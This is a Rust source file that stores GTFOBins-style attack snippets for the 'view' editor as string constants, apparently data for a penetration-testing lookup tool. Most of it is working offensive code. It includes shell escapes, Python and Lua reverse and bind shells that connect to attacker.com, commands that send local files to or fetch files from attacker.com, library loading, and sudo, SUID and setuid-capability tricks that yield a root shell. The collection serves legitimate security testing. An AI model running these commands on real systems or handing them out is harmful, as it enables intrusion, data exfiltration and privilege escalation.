pub static BIN_NAME: &'static str = "view";
pub static SH_CODE_1: &'static str = r#"
    
    view -c ':!/bin/sh'
"#;
pub static SH_CODE_2: &'static str = r#"
    
    view
    :set shell=/bin/sh
    :shell
"#;
pub static SH_DESC_3: &'static str =
    "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.";
pub static SH_CODE_3: &'static str = r#"
    
    view -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
"#;
pub static SH_DESC_4: &'static str = "This requires that `view` is compiled with Lua support.";
pub static SH_CODE_4: &'static str = r#"
    
    view -c ':lua os.execute("reset; exec sh")'
"#;
pub static RS_DESC: &'static str = "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
    s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")
    vim.command(":q!")'
"#;
pub static NIRS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.";
pub static NIRS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    view -c ':lua local s=require("socket"); local t=assert(s.tcp());
      t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
      while true do
        local r,x=t:receive();local f=assert(io.popen(r,"r"));
        local b=assert(f:read("*a"));t:send(b);
      end;
      f:close();t:close();'
"#;
pub static NIBS_DESC: &'static str = "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.";
pub static NIBS_CODE: &'static str = r#"
    
    export LPORT=12345
    view -c ':lua local k=require("socket");
      local s=assert(k.bind("*",os.getenv("LPORT")));
      local c=s:accept();
      while true do
        local r,x=c:receive();local f=assert(io.popen(r,"r"));
        local b=assert(f:read("*a"));c:send(b);
      end;c:close();f:close();'
"#;
pub static FU_DESC_1: &'static str = "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.";
pub static FU_CODE_1: &'static str = r#"
    
    export URL=http://attacker.com/
    export LFILE=file_to_send
    view -c ':py import vim,sys; from os import environ as e
    if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
    else: import urllib as u, urllib2 as r
    r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
    vim.command(":q!")'
"#;
pub static FU_DESC_2: &'static str = "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.";
pub static FU_CODE_2: &'static str = r#"
    
    export LPORT=8888
    view -c ':py import vim,sys; from os import environ as e
    if sys.version_info.major == 3: import http.server as s, socketserver as ss
    else: import SimpleHTTPServer as s, SocketServer as ss
    ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
    vim.command(":q!")'
"#;
pub static FU_DESC_3: &'static str = "Send a local file via TCP. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.";
pub static FU_CODE_3: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_send
    view -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
      local d=f:read("*a")
      io.close(f);
      local s=require("socket");
      local t=assert(s.tcp());
      t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
      t:send(d);
      t:close();'
"#;
pub static FD_DESC_1: &'static str = "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.";
pub static FD_CODE_1: &'static str = r#"
    
    export URL=http://attacker.com/file_to_get
    export LFILE=file_to_save
    view -c ':py import vim,sys; from os import environ as e
    if sys.version_info.major == 3: import urllib.request as r
    else: import urllib as r
    r.urlretrieve(e["URL"], e["LFILE"])
    vim.command(":q!")'
"#;
pub static FD_DESC_2: &'static str = "Fetch a remote file via TCP. Run `nc target.com 12345 < 'file_to_send'` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.";
pub static FD_CODE_2: &'static str = r#"
    
    export LPORT=12345
    export LFILE=file_to_save
    view -c ':lua local k=require("socket");
      local s=assert(k.bind("*",os.getenv("LPORT")));
      local c=s:accept();
      local d,x=c:receive("*a");
      c:close();
      local f=io.open(os.getenv("LFILE"), "wb");
      f:write(d);
      io.close(f);'
"#;
pub static FW_CODE: &'static str = r#"
    
    view file_to_write
    iDATA
    ^[
    w!
"#;
pub static FR_CODE: &'static str = r#"
    
    view file_to_read
"#;
pub static LL_DESC: &'static str =
    "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.";
pub static LL_CODE: &'static str = r#"
    
    view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
"#;
pub static SUID_DESC: &'static str =
    "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which view) .

    ./view -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    sudo view -c ':!/bin/sh'
"#;
pub static SUDO_DESC_2: &'static str =
    "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.";
pub static SUDO_CODE_2: &'static str = r#"
    
    sudo view -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
"#;
pub static SUDO_DESC_3: &'static str = "This requires that `view` is compiled with Lua support";
pub static SUDO_CODE_3: &'static str = r#"
    
    sudo view -c ':lua os.execute("reset; exec sh")'
"#;
pub static CB_DESC: &'static str =
    "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.";
pub static CB_CODE: &'static str = r#"
    
    cp $(which view) .
    sudo setcap cap_setuid+ep view

    ./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
"#;
pub static LSUID_DESC: &'static str = "This requires that `view` is compiled with Lua support.";
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which view) .

    ./view -c ':lua os.execute("reset; exec sh")'
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SH_3: Code<'static> = Code {
    title: "SH_CODE_3",
    code: SH_CODE_3,
    tag: Tag::SH,
};
pub static SH_4: Code<'static> = Code {
    title: "SH_CODE_4",
    code: SH_CODE_4,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static NIRS: Code<'static> = Code {
    title: "NIRS_CODE",
    code: NIRS_CODE,
    tag: Tag::NIRS,
};
pub static NIBS: Code<'static> = Code {
    title: "NIBS_CODE",
    code: NIBS_CODE,
    tag: Tag::NIBS,
};
pub static FU_1: Code<'static> = Code {
    title: "FU_CODE_1",
    code: FU_CODE_1,
    tag: Tag::FU,
};
pub static FU_2: Code<'static> = Code {
    title: "FU_CODE_2",
    code: FU_CODE_2,
    tag: Tag::FU,
};
pub static FU_3: Code<'static> = Code {
    title: "FU_CODE_3",
    code: FU_CODE_3,
    tag: Tag::FU,
};
pub static FD_1: Code<'static> = Code {
    title: "FD_CODE_1",
    code: FD_CODE_1,
    tag: Tag::FD,
};
pub static FD_2: Code<'static> = Code {
    title: "FD_CODE_2",
    code: FD_CODE_2,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static LL: Code<'static> = Code {
    title: "LL_CODE",
    code: LL_CODE,
    tag: Tag::LL,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static SUDO_3: Code<'static> = Code {
    title: "SUDO_CODE_3",
    code: SUDO_CODE_3,
    tag: Tag::SUDO,
};
pub static CB: Code<'static> = Code {
    title: "CB_CODE",
    code: CB_CODE,
    tag: Tag::CB,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
